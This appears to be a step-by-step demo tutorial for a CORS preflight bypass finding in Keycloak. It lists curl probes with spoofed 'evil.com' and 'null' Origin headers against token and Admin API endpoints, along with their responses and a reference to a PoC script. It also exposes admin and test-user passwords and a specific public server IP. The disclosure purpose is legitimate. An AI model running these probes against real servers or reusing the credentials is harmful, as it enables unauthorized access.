# Tutorial: Finding #1 — CORS OPTIONS Preflight Bypass

**Severity:** MEDIUM (CVSS 5.3)
**Demo time:** ~5 minutes
**Requirements:** Terminal + Browser (Keycloak Admin Console)

---

## Step 0: Ensure Keycloak is Running

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```
Expected output: `Keycloak OK: test`

---

## Step 1: Login to Admin Console — Show webOrigins Config

### 1a. Open browser, access Admin Console:
```
http://46.101.162.187:8080/admin/master/console/
```

### 1b. Login with admin credentials:
```
Username: admin
Password: Admin1234
```

### 1c. Navigate to client configuration:
1. Click **"test"** in the realm dropdown (top left)
2. Click **Clients** in the left sidebar
3. Click client **"webapp"**
4. Scroll down, find the **"Web origins"** section
5. **Screenshot/show** that the value is: `https://legitimate-app.com`

> **Key point:** The admin has configured webOrigins correctly — only `https://legitimate-app.com` should be allowed.

---

## Step 2: Verify webOrigins via CLI (Optional)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s "http://localhost:8080/admin/realms/test/clients?clientId=webapp" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import sys,json; print('webOrigins:', json.load(sys.stdin)[0]['webOrigins'])"
```
Output: `webOrigins: ['https://legitimate-app.com']`

---

## Step 3: Send OPTIONS Preflight from evil.com

This simulates a browser on `evil.com` sending a preflight check to Keycloak.

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type,Authorization"
```

**Expected (secure):** No `Access-Control-Allow-Origin` header
**Actual result (VULNERABLE):**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com        <-- SHOULD NOT BE PRESENT!
Access-Control-Allow-Credentials: true               <-- DANGEROUS!
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
```

> **evil.com is allowed even though it is NOT in webOrigins!**

---

## Step 4: Test null Origin (Sandboxed Iframe Attack)

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: POST"
```

**Output (VULNERABLE):**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

> Origin `null` is also accepted — this means attacks from `<iframe sandbox>`, `file://`, or `data:` URIs can bypass all restrictions.

---

## Step 5: Test Admin API Preflight

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/admin/realms/test/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type"
```

**Output (VULNERABLE):**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
```

> Even the Admin API preflight is bypassed — an attacker can send write requests (create user, delete client) from evil.com!

---

## Step 6: Control Test — Actual POST (This is the correct behavior)

```bash
curl -si -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
```

**Output:**
```
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
```
> **Note:** There is NO `Access-Control-Allow-Origin` in the actual response — the browser will block reading the response. However, the server still processes the request (write-CSRF still occurs).

---

## Step 7: Run Python PoC (Automated Full Test)

```bash
python3 pocs/poc_f1_cors_bypass.py --host http://localhost:8080
```

---

## Summary

| Test | Expected | Actual | Status |
|---|---|---|---|
| OPTIONS from evil.com | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
| OPTIONS from null | No ACAO header | `ACAO: null` | VULNERABLE |
| OPTIONS Admin API | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
| Actual POST | No ACAO header | No ACAO header | Correct (but server still processes) |

**Conclusion:** webOrigins per-client has NO effect on OPTIONS preflight — all origins can pass the preflight check.
